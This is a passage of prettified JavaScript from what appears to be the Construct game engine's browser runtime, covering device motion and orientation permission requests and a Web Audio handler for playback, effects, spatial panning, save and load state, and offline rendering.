          this.AddRuntimeMessageHandler('request-permission', (e) =>
            this._OnRequestPermission(e)
          );
      }
      async _OnRequestPermission(e) {
        const type = e.type;
        let result = !0;
        0 === type
          ? (result = await this._RequestOrientationPermission())
          : 1 === type && (result = await this._RequestMotionPermission()),
          this.PostToRuntime('permission-result', {
            type: type,
            result: result,
          });
      }
      async _RequestOrientationPermission() {
        if (
          !self.DeviceOrientationEvent ||
          !self.DeviceOrientationEvent.requestPermission
        )
          return !0;
        try {
          return (
            'granted' ===
            (await self.DeviceOrientationEvent.requestPermission())
          );
        } catch (err) {
          return (
            console.warn(
              '[Touch] Failed to request orientation permission: ',
              err
            ),
            !1
          );
        }
      }
      async _RequestMotionPermission() {
        if (
          !self.DeviceMotionEvent ||
          !self.DeviceMotionEvent.requestPermission
        )
          return !0;
        try {
          return (
            'granted' === (await self.DeviceMotionEvent.requestPermission())
          );
        } catch (err) {
          return (
            console.warn('[Touch] Failed to request motion permission: ', err),
            !1
          );
        }
      }
    };
  self.RuntimeInterface.AddDOMHandlerClass(HANDLER_CLASS);
}
{
  const R_TO_D = 180 / Math.PI,
    DOM_COMPONENT_ID = 'audio';
  (self.AudioDOMHandler = class AudioDOMHandler extends self.DOMHandler {
    constructor(iRuntime) {
      super(iRuntime, DOM_COMPONENT_ID),
        (this._audioContext = null),
        (this._destinationNode = null),
        (this._hasUnblocked = !1),
        (this._hasAttachedUnblockEvents = !1),
        (this._unblockFunc = () => this._UnblockAudioContext()),
        (this._audioBuffers = []),
        (this._audioInstances = []),
        (this._lastAudioInstance = null),
        (this._lastPlayedTags = []),
        (this._loadedAudioUrls = new Set()),
        (this._lastTickCount = -1),
        (this._pendingTags = new Map()),
        (this._masterVolume = 1),
        (this._isSilent = !1),
        (this._timeScaleMode = 0),
        (this._timeScale = 1),
        (this._gameTime = 0),
        (this._panningModel = 'HRTF'),
        (this._distanceModel = 'inverse'),
        (this._refDistance = 600),
        (this._maxDistance = 1e4),
        (this._rolloffFactor = 1),
        (this._lastListenerPos = [0, 0, 0]),
        (this._lastListenerOrientation = [0, 0, -1, 0, 1, 0]),
        (this._playMusicAsSound = !1),
        (this._hasAnySoftwareDecodedMusic = !1),
        (this._supportsWebMOpus = this._iRuntime.IsAudioFormatSupported(
          'audio/webm; codecs=opus'
        )),
        (this._effects = new Map()),
        (this._analysers = new Set()),
        (this._isPendingPostFxState = !1),
        (this._hasStartedOfflineRender = !1),
        (this._microphoneTag = ''),
        (this._microphoneSource = null),
        (self.C3Audio_OnMicrophoneStream = (localMediaStream, tag) =>
          this._OnMicrophoneStream(localMediaStream, tag)),
        (this._destMediaStreamNode = null),
        (self.C3Audio_GetOutputStream = () => this._OnGetOutputStream()),
        (self.C3Audio_DOMInterface = this),
        this.AddRuntimeMessageHandlers([
          ['create-audio-context', (e) => this._CreateAudioContext(e)],
          ['play', (e) => this._Play(e)],
          ['stop', (e) => this._Stop(e)],
          ['stop-all', () => this._StopAll()],
          ['set-paused', (e) => this._SetPaused(e)],
          ['set-volume', (e) => this._SetVolume(e)],
          ['fade-volume', (e) => this._FadeVolume(e)],
          ['set-master-volume', (e) => this._SetMasterVolume(e)],
          ['set-muted', (e) => this._SetMuted(e)],
          ['set-silent', (e) => this._SetSilent(e)],
          ['set-looping', (e) => this._SetLooping(e)],
          ['set-playback-rate', (e) => this._SetPlaybackRate(e)],
          ['set-stereo-pan', (e) => this._SetStereoPan(e)],
          ['seek', (e) => this._Seek(e)],
          ['preload', (e) => this._Preload(e)],
          ['unload', (e) => this._Unload(e)],
          ['unload-all', () => this._UnloadAll()],
          ['set-suspended', (e) => this._SetSuspended(e)],
          ['add-effect', (e) => this._AddEffect(e)],
          ['set-effect-param', (e) => this._SetEffectParam(e)],
          ['remove-effects', (e) => this._RemoveEffects(e)],
          ['tick', (e) => this._OnTick(e)],
          ['load-state', (e) => this._OnLoadState(e)],
          ['offline-render-audio', (e) => this._OnOfflineRenderAudio(e)],
          ['offline-render-finish', () => this._OnOfflineRenderFinish()],
        ]);
    }
    async _CreateAudioContext(e) {
      if (
        ((e.isiOSCordova || e.isSafari) && (this._playMusicAsSound = !0),
        (this._timeScaleMode = e.timeScaleMode),
        (this._panningModel = ['equalpower', 'HRTF', 'soundfield'][
          e.panningModel
        ]),
        (this._distanceModel = ['linear', 'inverse', 'exponential'][
          e.distanceModel
        ]),
        (this._refDistance = e.refDistance),
        (this._maxDistance = e.maxDistance),
        (this._rolloffFactor = e.rolloffFactor),
        this._iRuntime.IsExportingToVideo())
      ) {
        this._playMusicAsSound = !0;
        const sampleRate = 48e3;
        this._audioContext = new OfflineAudioContext({
          numberOfChannels: 2,
          sampleRate: sampleRate,
          length: Math.ceil(
            this._iRuntime.GetExportToVideoDuration() * sampleRate
          ),
        });
      } else {
        const opts = { latencyHint: e.latencyHint };
        if (
          (this.SupportsWebMOpus() || (opts.sampleRate = 48e3),
          'undefined' != typeof AudioContext)
        )
          this._audioContext = new AudioContext(opts);
        else {
          if ('undefined' == typeof webkitAudioContext)
            throw new Error('Web Audio API not supported');
          this._audioContext = new webkitAudioContext(opts);
        }
        this._AttachUnblockEvents(),
          (this._audioContext.onstatechange = () => {
            'running' !== this._audioContext.state &&
              this._AttachUnblockEvents(),
              this.PostToRuntime('audiocontext-state', {
                audioContextState: this._audioContext.state,
              });
          });
      }
      (this._destinationNode = this._audioContext.createGain()),
        this._destinationNode.connect(this._audioContext.destination);
      const listenerPos = e.listenerPos;
      (this._lastListenerPos[0] = listenerPos[0]),
        (this._lastListenerPos[1] = listenerPos[1]),
        (this._lastListenerPos[2] = listenerPos[2]),
        this._audioContext.listener.setPosition(
          listenerPos[0],
          listenerPos[1],
          listenerPos[2]
        ),
        this._audioContext.listener.setOrientation(
          ...this._lastListenerOrientation
        ),
        (self.C3_GetAudioContextCurrentTime = () => this.GetAudioCurrentTime());
      try {
        await Promise.all(
          e.preloadList.map((o) =>
            this._GetAudioBuffer(o.originalUrl, o.url, o.type, !1)
          )
        );
      } catch (err) {
        console.error('[Construct] Preloading sounds failed: ', err);
      }
      return {
        sampleRate: this._audioContext.sampleRate,
        audioContextState: this._audioContext.state,
        outputLatency: this._audioContext.outputLatency || 0,
      };
    }
    _AttachUnblockEvents() {
      this._hasAttachedUnblockEvents ||
        ((this._hasUnblocked = !1),
        window.addEventListener('pointerup', this._unblockFunc, !0),
        window.addEventListener('touchend', this._unblockFunc, !0),
        window.addEventListener('click', this._unblockFunc, !0),
        window.addEventListener('keydown', this._unblockFunc, !0),
        (this._hasAttachedUnblockEvents = !0));
    }
    _DetachUnblockEvents() {
      this._hasAttachedUnblockEvents &&
        ((this._hasUnblocked = !0),
        window.removeEventListener('pointerup', this._unblockFunc, !0),
        window.removeEventListener('touchend', this._unblockFunc, !0),
        window.removeEventListener('click', this._unblockFunc, !0),
        window.removeEventListener('keydown', this._unblockFunc, !0),
        (this._hasAttachedUnblockEvents = !1));
    }
    _UnblockAudioContext() {
      if (this._hasUnblocked) return;
      const audioContext = this._audioContext;
      'suspended' === audioContext.state &&
        audioContext.resume &&
        audioContext.resume();
      const buffer = audioContext.createBuffer(1, 220, 22050),
        source = audioContext.createBufferSource();
      (source.buffer = buffer),
        source.connect(audioContext.destination),
        source.start(0),
        'running' === audioContext.state && this._DetachUnblockEvents();
    }
    _MatchTagLists(tagArr1, tagArr2) {
      for (const t2 of tagArr2) {
        let found = !1;
        for (const t1 of tagArr1)
          if (self.AudioDOMHandler.EqualsNoCase(t1, t2)) {
            found = !0;
            break;
          }
        if (!found) return !1;
      }
      return !0;
    }
    GetAudioContext() {
      return this._audioContext;
    }
    GetAudioCurrentTime() {
      return this._audioContext.currentTime;
    }
    GetDestinationNode() {
      return this._destinationNode;
    }
    GetAudioContextExtern() {
      return this.GetAudioContext();
    }
    GetDestinationNodeExtern() {
      return this.GetDestinationNode();
    }
    GetDestinationForTag(tag) {
      const fxChain = this._effects.get(tag.toLowerCase());
      return fxChain ? fxChain[0].GetInputNode() : this.GetDestinationNode();
    }
    AddEffectForTag(tag, effect) {
      tag = tag.toLowerCase();
      let fxChain = this._effects.get(tag);
      fxChain || ((fxChain = []), this._effects.set(tag, fxChain)),
        effect._SetIndex(fxChain.length),
        effect._SetTag(tag),
        fxChain.push(effect),
        this._ReconnectEffects(tag);
    }
    _ReconnectEffects(tag) {
      tag = tag.toLowerCase();
      let destNode = this.GetDestinationNode();
      const fxChain = this._effects.get(tag);
      if (fxChain && fxChain.length) {
        destNode = fxChain[0].GetInputNode();
        for (let i = 0, len = fxChain.length; i < len; ++i) {
          const n = fxChain[i];
          i + 1 === len
            ? n.ConnectTo(this.GetDestinationNode())
            : n.ConnectTo(fxChain[i + 1].GetInputNode());
        }
      }
      for (const ai of this.audioInstancesByEffectTag(tag))
        ai.Reconnect(destNode);
      this._microphoneSource &&
        this._microphoneTag === tag &&
        (this._microphoneSource.disconnect(),
        this._microphoneSource.connect(destNode));
    }
    GetMasterVolume() {
      return this._masterVolume;
    }
    IsSilent() {
      return this._isSilent;
    }
    GetTimeScaleMode() {
      return this._timeScaleMode;
    }
    GetTimeScale() {
      return this._timeScale;
    }
    GetGameTime() {
      return this._gameTime;
    }
    IsPlayMusicAsSound() {
      return this._playMusicAsSound;
    }
    SupportsWebMOpus() {
      return this._supportsWebMOpus;
    }
    _SetHasAnySoftwareDecodedMusic() {
      this._hasAnySoftwareDecodedMusic = !0;
    }
    GetPanningModel() {
      return this._panningModel;
    }
    GetDistanceModel() {
      return this._distanceModel;
    }
    GetReferenceDistance() {
      return this._refDistance;
    }
    GetMaxDistance() {
      return this._maxDistance;
    }
    GetRolloffFactor() {
      return this._rolloffFactor;
    }
    DecodeAudioData(audioData, needsSoftwareDecode) {
      return needsSoftwareDecode
        ? this._iRuntime._WasmDecodeWebMOpus(audioData).then((rawAudio) => {
            const audioBuffer = this._audioContext.createBuffer(
              1,
              rawAudio.length,
              48e3
            );
            return audioBuffer.getChannelData(0).set(rawAudio), audioBuffer;
          })
        : new Promise((resolve, reject) => {
            this._audioContext.decodeAudioData(audioData, resolve, reject);
          });
    }
    TryPlayMedia(mediaElem) {
      this._iRuntime.TryPlayMedia(mediaElem);
    }
    RemovePendingPlay(mediaElem) {
      this._iRuntime.RemovePendingPlay(mediaElem);
    }
    ReleaseInstancesForBuffer(buffer) {
      let j = 0;
      for (let i = 0, len = this._audioInstances.length; i < len; ++i) {
        const a = this._audioInstances[i];
        (this._audioInstances[j] = a),
          a.GetBuffer() === buffer ? a.Release() : ++j;
      }
      this._audioInstances.length = j;
    }
    ReleaseAllMusicBuffers() {
      let j = 0;
      for (let i = 0, len = this._audioBuffers.length; i < len; ++i) {
        const b = this._audioBuffers[i];
        (this._audioBuffers[j] = b), b.IsMusic() ? b.Release() : ++j;
      }
      this._audioBuffers.length = j;
    }
    *audioInstancesMatchingTags(tags) {
      if (tags.length > 0)
        for (const ai of this._audioInstances)
          this._MatchTagLists(ai.GetTags(), tags) && (yield ai);
      else
        this._lastAudioInstance &&
          !this._lastAudioInstance.HasEnded() &&
          (yield this._lastAudioInstance);
    }
    *audioInstancesByEffectTag(tag) {
      if (tag)
        for (const ai of this._audioInstances)
          self.AudioDOMHandler.EqualsNoCase(ai.GetEffectTag(), tag) &&
            (yield ai);
      else
        this._lastAudioInstance &&
          !this._lastAudioInstance.HasEnded() &&
          (yield this._lastAudioInstance);
    }
    async _GetAudioBuffer(originalUrl, url, type, isMusic, dontCreate) {
      for (const ab of this._audioBuffers)
        if (ab.GetUrl() === url) return await ab.Load(), ab;
      if (dontCreate) return null;
      isMusic &&
        (this._playMusicAsSound || this._hasAnySoftwareDecodedMusic) &&
        this.ReleaseAllMusicBuffers();
      const ret = self.C3AudioBuffer.Create(
        this,
        originalUrl,
        url,
        type,
        isMusic
      );
      return (
        this._audioBuffers.push(ret),
        await ret.Load(),
        this._loadedAudioUrls.has(originalUrl) ||
          (this.PostToRuntime('buffer-metadata', {
            originalUrl: originalUrl,
            duration: ret.GetDuration(),
          }),
          this._loadedAudioUrls.add(originalUrl)),
        ret
      );
    }
    async _GetAudioInstance(originalUrl, url, type, tags, isMusic) {
      for (const ai of this._audioInstances)
        if (ai.GetUrl() === url && (ai.CanBeRecycled() || isMusic))
          return ai.SetTags(tags), ai;
      const ret = (
        await this._GetAudioBuffer(originalUrl, url, type, isMusic)
      ).CreateInstance(tags);
      return this._audioInstances.push(ret), ret;
    }
    _AddPendingTags(tags) {
      const tagStr = tags.join(' ');
      let info = this._pendingTags.get(tagStr);
      if (!info) {
        let resolve = null;
        (info = {
          pendingCount: 0,
          promise: new Promise((r) => (resolve = r)),
          resolve: resolve,
        }),
          this._pendingTags.set(tagStr, info);
      }
      info.pendingCount++;
    }
    _RemovePendingTags(tags) {
      const tagStr = tags.join(' '),
        info = this._pendingTags.get(tagStr);
      if (!info) throw new Error('expected pending tag');
      info.pendingCount--,
        0 === info.pendingCount &&
          (info.resolve(), this._pendingTags.delete(tagStr));
    }
    TagsReady(tags) {
      const tagStr = (0 === tags.length ? this._lastPlayedTags : tags).join(
          ' '
        ),
        info = this._pendingTags.get(tagStr);
      return info ? info.promise : Promise.resolve();
    }
    _MaybeStartTicking() {
      if (this._analysers.size > 0) this._StartTicking();
      else
        for (const ai of this._audioInstances)
          if (ai.IsActive()) return void this._StartTicking();
    }
    Tick() {
      for (const a of this._analysers) a.Tick();
      const currentTime = this.GetAudioCurrentTime();
      for (const ai of this._audioInstances) ai.Tick(currentTime);
      const instStates = this._audioInstances
        .filter((a) => a.IsActive())
        .map((a) => a.GetState());
      this.PostToRuntime('state', {
        tickCount: this._lastTickCount,
        outputLatency: this._audioContext.outputLatency || 0,
        audioInstances: instStates,
        analysers: [...this._analysers].map((a) => a.GetData()),
      }),
        0 === instStates.length &&
          0 === this._analysers.size &&
          this._StopTicking();
    }
    PostTrigger(type, tags, aiid) {
      this.PostToRuntime('trigger', { type: type, tags: tags, aiid: aiid });
    }
    async _Play(e) {
      const originalUrl = e.originalUrl,
        url = e.url,
        type = e.type,
        isMusic = e.isMusic,
        tags = e.tags,
        isLooping = e.isLooping,
        volume = e.vol,
        position = e.pos,
        panning = e.panning,
        stereoPan = e.stereoPan;
      let startTime = e.off;
      if (startTime > 0 && !e.trueClock)
        if (this._audioContext.getOutputTimestamp) {
          const outputTimestamp = this._audioContext.getOutputTimestamp();
          startTime =
            startTime -
            outputTimestamp.performanceTime / 1e3 +
            outputTimestamp.contextTime;
        } else
          startTime =
            startTime -
            performance.now() / 1e3 +
            this._audioContext.currentTime;
      (this._lastPlayedTags = tags.slice(0)), this._AddPendingTags(tags);
      try {
        (this._lastAudioInstance = await this._GetAudioInstance(
          originalUrl,
          url,
          type,
          tags,
          isMusic
        )),
          panning
            ? (this._lastAudioInstance.SetPannerEnabled(!0),
              this._lastAudioInstance.SetPan(
                panning.x,
                panning.y,
                panning.z,
                panning.angle,
                panning.innerAngle,
                panning.outerAngle,
                panning.outerGain
              ),
              panning.hasOwnProperty('uid') &&
                this._lastAudioInstance.SetUID(panning.uid))
            : 'number' == typeof stereoPan && 0 !== stereoPan
            ? (this._lastAudioInstance.SetStereoPannerEnabled(!0),
              this._lastAudioInstance.SetStereoPan(stereoPan))
            : (this._lastAudioInstance.SetPannerEnabled(!1),
              this._lastAudioInstance.SetStereoPannerEnabled(!1)),
          this._lastAudioInstance.Play(isLooping, volume, position, startTime);
      } catch (err) {
        return void console.error(
          '[Construct] Audio: error starting playback: ',
          err
        );
      } finally {
        this._RemovePendingTags(tags);
      }
      this._StartTicking();
    }
    _Stop(e) {
      const tags = e.tags;
      for (const ai of this.audioInstancesMatchingTags(tags)) ai.Stop();
    }
    _StopAll() {
      for (const ai of this._audioInstances) ai.Stop();
    }
    _SetPaused(e) {
      const tags = e.tags,
        paused = e.paused;
      for (const ai of this.audioInstancesMatchingTags(tags))
        paused ? ai.Pause() : ai.Resume();
      this._MaybeStartTicking();
    }
    _SetVolume(e) {
      const tags = e.tags,
        vol = e.vol;
      for (const ai of this.audioInstancesMatchingTags(tags)) ai.SetVolume(vol);
    }
    _SetStereoPan(e) {
      const tags = e.tags,
        p = e.p;
      for (const ai of this.audioInstancesMatchingTags(tags))
        ai.SetStereoPannerEnabled(!0), ai.SetStereoPan(p);
    }
    async _FadeVolume(e) {
      const tags = e.tags,
        vol = e.vol,
        duration = e.duration,
        stopOnEnd = e.stopOnEnd;
      await this.TagsReady(tags);
      for (const ai of this.audioInstancesMatchingTags(tags))
        ai.FadeVolume(vol, duration, stopOnEnd);
      this._MaybeStartTicking();
    }
    _SetMasterVolume(e) {
      (this._masterVolume = e.vol),
        (this._destinationNode.gain.value = this._masterVolume);
    }
    _SetMuted(e) {
      const tags = e.tags,
        isMuted = e.isMuted;
      for (const ai of this.audioInstancesMatchingTags(tags))
        ai.SetMuted(isMuted);
    }
    _SetSilent(e) {
      (this._isSilent = e.isSilent), this._iRuntime.SetSilent(this._isSilent);
      for (const ai of this._audioInstances) ai._UpdateMuted();
    }
    _SetLooping(e) {
      const tags = e.tags,
        isLooping = e.isLooping;
      for (const ai of this.audioInstancesMatchingTags(tags))
        ai.SetLooping(isLooping);
    }
    async _SetPlaybackRate(e) {
      const tags = e.tags,
        rate = e.rate;
      await this.TagsReady(tags);
      for (const ai of this.audioInstancesMatchingTags(tags))
        ai.SetPlaybackRate(rate);
    }
    async _Seek(e) {
      const tags = e.tags,
        pos = e.pos;
      await this.TagsReady(tags);
      for (const ai of this.audioInstancesMatchingTags(tags)) ai.Seek(pos);
    }
    async _Preload(e) {
      const originalUrl = e.originalUrl,
        url = e.url,
        type = e.type,
        isMusic = e.isMusic;
      try {
        await this._GetAudioInstance(originalUrl, url, type, '', isMusic);
      } catch (err) {
        console.error('[Construct] Audio: error preloading: ', err);
      }
    }
    async _Unload(e) {
      const url = e.url,
        type = e.type,
        isMusic = e.isMusic,
        buffer = await this._GetAudioBuffer('', url, type, isMusic, !0);
      if (!buffer) return;
      buffer.Release();
      const i = this._audioBuffers.indexOf(buffer);
      -1 !== i && this._audioBuffers.splice(i, 1);
    }
    _UnloadAll() {
      for (const buffer of this._audioBuffers) buffer.Release();
      this._audioBuffers.length = 0;
    }
    _SetSuspended(e) {
      const isSuspended = e.isSuspended;
      !isSuspended && this._audioContext.resume && this._audioContext.resume();
      for (const ai of this._audioInstances) ai.SetSuspended(isSuspended);
      isSuspended && this._audioContext.suspend && this._audioContext.suspend();
    }
    _OnTick(e) {
      if (
        ((this._timeScale = e.timeScale),
        (this._gameTime = e.gameTime),
        (this._lastTickCount = e.tickCount),
        0 !== this._timeScaleMode)
      )
        for (const ai of this._audioInstances) ai._UpdatePlaybackRate();
      const listenerPos = e.listenerPos;
      !listenerPos ||
        (this._lastListenerPos[0] === listenerPos[0] &&
          this._lastListenerPos[1] === listenerPos[1] &&
          this._lastListenerPos[2] === listenerPos[2]) ||
        ((this._lastListenerPos[0] = listenerPos[0]),
        (this._lastListenerPos[1] = listenerPos[1]),
        (this._lastListenerPos[2] = listenerPos[2]),
        this._audioContext.listener.setPosition(
          listenerPos[0],
          listenerPos[1],
          listenerPos[2]
        ));
      const listenerOrientation = e.listenerOrientation;
      if (
        listenerOrientation &&
        (this._lastListenerOrientation[0] !== listenerOrientation[0] ||
          this._lastListenerOrientation[1] !== listenerOrientation[1] ||
          this._lastListenerOrientation[2] !== listenerOrientation[2] ||
          this._lastListenerOrientation[3] !== listenerOrientation[3] ||
          this._lastListenerOrientation[4] !== listenerOrientation[4] ||
          this._lastListenerOrientation[5] !== listenerOrientation[5])
      ) {
        for (let i = 0; i < 6; ++i)
          this._lastListenerOrientation[i] = listenerOrientation[i];
        this._audioContext.listener.setOrientation(
          ...this._lastListenerOrientation
        );
      }
      for (const instPan of e.instPans) {
        const uid = instPan.uid;
        for (const ai of this._audioInstances)
          ai.GetUID() === uid &&
            ai.SetPanXYZA(instPan.x, instPan.y, instPan.z, instPan.angle);
      }
    }
    async _AddEffect(e) {
      const type = e.type,
        tags = e.hasOwnProperty('tags') ? e.tags : [e.tag],
        params = e.params;
      let effect, convolutionBuffer;
      if ('convolution' === type)
        try {
          convolutionBuffer = await this._GetAudioBuffer(
            e.bufferOriginalUrl,
            e.bufferUrl,
            e.bufferType,
            !1
          );
        } catch (err) {
          return void console.log(
            '[Construct] Audio: error loading convolution: ',
            err
          );
        }
      for (const tag of tags) {
        if ('filter' === type)
          effect = new self.C3AudioFilterFX(this, ...params);
        else if ('delay' === type)
          effect = new self.C3AudioDelayFX(this, ...params);
        else if ('convolution' === type)
          (effect = new self.C3AudioConvolveFX(
            this,
            convolutionBuffer.GetAudioBuffer(),
            ...params
          )),
            effect._SetBufferInfo(
              e.bufferOriginalUrl,
              e.bufferUrl,
              e.bufferType
            );
        else if ('flanger' === type)
          effect = new self.C3AudioFlangerFX(this, ...params);
        else if ('phaser' === type)
          effect = new self.C3AudioPhaserFX(this, ...params);
        else if ('gain' === type)
          effect = new self.C3AudioGainFX(this, ...params);
        else if ('stereopan' === type)
          effect = new self.C3AudioStereoPanFX(this, ...params);
        else if ('tremolo' === type)
          effect = new self.C3AudioTremoloFX(this, ...params);
        else if ('ringmod' === type)
          effect = new self.C3AudioRingModFX(this, ...params);
        else if ('distortion' === type)
          effect = new self.C3AudioDistortionFX(this, ...params);
        else if ('compressor' === type)
          effect = new self.C3AudioCompressorFX(this, ...params);
        else {
          if ('analyser' !== type) throw new Error('invalid effect type');
          effect = new self.C3AudioAnalyserFX(this, ...params);
        }
        this.AddEffectForTag(tag, effect);
      }
      this._PostUpdatedFxState();
    }
    _SetEffectParam(e) {
      const tags = e.tags,
        index = e.index,
        param = e.param,
        value = e.value,
        ramp = e.ramp,
        time = e.time;
      for (const tag of tags) {
        const fxChain = this._effects.get(tag.toLowerCase());
        !fxChain ||
          index < 0 ||
          index >= fxChain.length ||
          fxChain[index].SetParam(param, value, ramp, time);
      }
      this._PostUpdatedFxState();
    }
    _RemoveEffects(e) {
      const tags = e.tags;
      for (const tag of tags) {
        const lowerTag = tag.toLowerCase(),
          fxChain = this._effects.get(lowerTag);
        if (!fxChain || !fxChain.length) return;
        for (const effect of fxChain) effect.Release();
        this._effects.delete(lowerTag), this._ReconnectEffects(lowerTag);
      }
    }
    _AddAnalyser(analyser) {
      this._analysers.add(analyser), this._MaybeStartTicking();
    }
    _RemoveAnalyser(analyser) {
      this._analysers.delete(analyser);
    }
    _PostUpdatedFxState() {
      this._isPendingPostFxState ||
        ((this._isPendingPostFxState = !0),
        Promise.resolve().then(() => this._DoPostUpdatedFxState()));
    }
    _DoPostUpdatedFxState() {
      const fxstate = {};
      for (const [tag, fxChain] of this._effects)
        fxstate[tag] = fxChain.map((e) => e.GetState());
      this.PostToRuntime('fxstate', { fxstate: fxstate }),
        (this._isPendingPostFxState = !1);
    }
    async _OnLoadState(e) {
      const saveLoadMode = e.saveLoadMode;
      if (3 !== saveLoadMode) {
        const keepAudioInstances = [];
        for (const ai of this._audioInstances)
          (ai.IsMusic() && 1 === saveLoadMode) ||
          (!ai.IsMusic() && 2 === saveLoadMode)
            ? keepAudioInstances.push(ai)
            : ai.Release();
        this._audioInstances = keepAudioInstances;
      }
      for (const fxChain of this._effects.values())
        for (const effect of fxChain) effect.Release();
      this._effects.clear(),
        (this._timeScale = e.timeScale),
        (this._gameTime = e.gameTime);
      const listenerPos = e.listenerPos;
      (this._lastListenerPos[0] = listenerPos[0]),
        (this._lastListenerPos[1] = listenerPos[1]),
        (this._lastListenerPos[2] = listenerPos[2]),
        this._audioContext.listener.setPosition(
          listenerPos[0],
          listenerPos[1],
          listenerPos[2]
        );
      const listenerOrientation = e.listenerOrientation;
      if (Array.isArray(listenerOrientation)) {
        for (let i = 0; i < 6; ++i)
          this._lastListenerOrientation[i] = listenerOrientation[i];
        this._audioContext.listener.setOrientation(
          ...this._lastListenerOrientation
        );
      }
      (this._isSilent = e.isSilent),
        this._iRuntime.SetSilent(this._isSilent),
        (this._masterVolume = e.masterVolume),
        (this._destinationNode.gain.value = this._masterVolume);
      const promises = [];
      for (const fxChainData of Object.values(e.effects))
        promises.push(Promise.all(fxChainData.map((d) => this._AddEffect(d))));
      await Promise.all(promises),
        await Promise.all(
          e.playing.map((d) => this._LoadAudioInstance(d, saveLoadMode))
        ),
        this._MaybeStartTicking();
    }
    async _LoadAudioInstance(d, saveLoadMode) {
      if (3 === saveLoadMode) return;
      const originalUrl = d.bufferOriginalUrl,
        url = d.bufferUrl,
        type = d.bufferType,
        isMusic = d.isMusic,
        tags = d.tags,
        isLooping = d.isLooping,
        volume = d.volume,
        position = d.playbackTime;
      if (isMusic && 1 === saveLoadMode) return;
      if (!isMusic && 2 === saveLoadMode) return;
      let ai = null;
      try {
        ai = await this._GetAudioInstance(
          originalUrl,
          url,
          type,
          tags,
          isMusic
        );
      } catch (err) {
        return void console.error(
          '[Construct] Audio: error loading audio state: ',
          err
        );
      }
      ai.LoadPanState(d.pan),
        ai.LoadStereoPanState(d.stereoPan),
        ai.Play(isLooping, volume, position, 0),
        d.isPlaying || ai.Pause(),
        ai._LoadAdditionalState(d);
    }
    _OnMicrophoneStream(localMediaStream, tag) {
      this._microphoneSource && this._microphoneSource.disconnect(),
        (this._microphoneTag = tag.toLowerCase()),
        (this._microphoneSource =
          this._audioContext.createMediaStreamSource(localMediaStream)),
        this._microphoneSource.connect(
          this.GetDestinationForTag(this._microphoneTag)
        );
    }
    _OnGetOutputStream() {
      return (
        this._destMediaStreamNode ||
          ((this._destMediaStreamNode =
            this._audioContext.createMediaStreamDestination()),
          this._destinationNode.connect(this._destMediaStreamNode)),
        this._destMediaStreamNode.stream
      );
    }
    async _OnOfflineRenderAudio(e) {
      try {
        const time = e.time,
          suspendPromise = this._audioContext.suspend(time);
        this._hasStartedOfflineRender
          ? this._audioContext.resume()
          : (this._audioContext
              .startRendering()
              .then((buffer) => this._OnOfflineRenderCompleted(buffer))
              .catch((err) => this._OnOfflineRenderError(err)),
            (this._hasStartedOfflineRender = !0)),
          await suspendPromise;
      } catch (err) {
        this._OnOfflineRenderError(err);
      }
    }
    _OnOfflineRenderFinish() {
      this._audioContext.resume();
    }
    _OnOfflineRenderCompleted(buffer) {
      const channelArrayBuffers = [];
      for (let i = 0, len = buffer.numberOfChannels; i < len; ++i) {
        const f32arr = buffer.getChannelData(i);
        channelArrayBuffers.push(f32arr.buffer);
      }
      this._iRuntime.PostToRuntimeComponent(
        'runtime',
        'offline-audio-render-completed',
        {
          duration: buffer.duration,
          length: buffer.length,
          numberOfChannels: buffer.numberOfChannels,
          sampleRate: buffer.sampleRate,
          channelData: channelArrayBuffers,
        },
        null,
        channelArrayBuffers
      );
    }
    _OnOfflineRenderError(err) {
      console.error('[Audio] Offline rendering error: ', err);
    }
    static EqualsNoCase(a, b) {
      return (
        a === b || a.normalize().toLowerCase() === b.normalize().toLowerCase()
      );
    }
    static ToDegrees(x) {
      return x * R_TO_D;
    }
    static DbToLinearNoCap(x) {
      return Math.pow(10, x / 20);
    }
    static DbToLinear(x) {
      return Math.max(Math.min(self.AudioDOMHandler.DbToLinearNoCap(x), 1), 0);
    }
    static LinearToDbNoCap(x) {
      return (Math.log(x) / Math.log(10)) * 20;
    }
    static LinearToDb(x) {
      return self.AudioDOMHandler.LinearToDbNoCap(Math.max(Math.min(x, 1), 0));
    }
    static e4(x, k) {
      return 1 - Math.exp(-k * x);
    }
  }),
    self.RuntimeInterface.AddDOMHandlerClass(self.AudioDOMHandler);
}
(self.C3AudioBuffer = class C3AudioBuffer {
  constructor(audioDomHandler, originalUrl, url, type, isMusic) {
    (this._audioDomHandler = audioDomHandler),
      (this._originalUrl = originalUrl),
      (this._url = url),
      (this._type = type),
      (this._isMusic = isMusic),
      (this._api = ''),
      (this._loadState = 'not-loaded'),
      (this._loadPromise = null);
  }
  Release() {
    (this._loadState = 'not-loaded'),
      (this._audioDomHandler = null),
      (this._loadPromise = null);
  }
  static Create(audioDomHandler, originalUrl, url, type, isMusic) {
    const needsSoftwareDecode =
      'audio/webm; codecs=opus' === type && !audioDomHandler.SupportsWebMOpus();
    return (
      isMusic &&
        needsSoftwareDecode &&
        audioDomHandler._SetHasAnySoftwareDecodedMusic(),
      !isMusic || audioDomHandler.IsPlayMusicAsSound() || needsSoftwareDecode
        ? new self.C3WebAudioBuffer(
            audioDomHandler,
            originalUrl,
            url,
            type,
            isMusic,
            needsSoftwareDecode
          )
        : new self.C3Html5AudioBuffer(
            audioDomHandler,
            originalUrl,
            url,
            type,
            isMusic
          )
    );
  }
  CreateInstance(tags) {
    return 'html5' === this._api
      ? new self.C3Html5AudioInstance(this._audioDomHandler, this, tags)
      : new self.C3WebAudioInstance(this._audioDomHandler, this, tags);
  }
  _Load() {}
  Load() {
    return (
      this._loadPromise || (this._loadPromise = this._Load()), this._loadPromise
    );
  }
  IsLoaded() {}
  IsLoadedAndDecoded() {}
  HasFailedToLoad() {
    return 'failed' === this._loadState;
  }
  GetAudioContext() {
    return this._audioDomHandler.GetAudioContext();
  }
  GetApi() {
    return this._api;
  }
  GetOriginalUrl() {
    return this._originalUrl;
  }
  GetUrl() {
    return this._url;
  }
  GetContentType() {
    return this._type;
  }
  IsMusic() {
    return this._isMusic;
  }
  GetDuration() {}
}),
  (self.C3Html5AudioBuffer = class C3Html5AudioBuffer extends (
    self.C3AudioBuffer
  ) {
    constructor(audioDomHandler, originalUrl, url, type, isMusic) {
      super(audioDomHandler, originalUrl, url, type, isMusic),
        (this._api = 'html5'),
        (this._audioElem = new Audio()),
        (this._audioElem.crossOrigin = 'anonymous'),
        (this._audioElem.autoplay = !1),
        (this._audioElem.preload = 'auto'),
        (this._loadResolve = null),
        (this._loadReject = null),
        (this._reachedCanPlayThrough = !1),
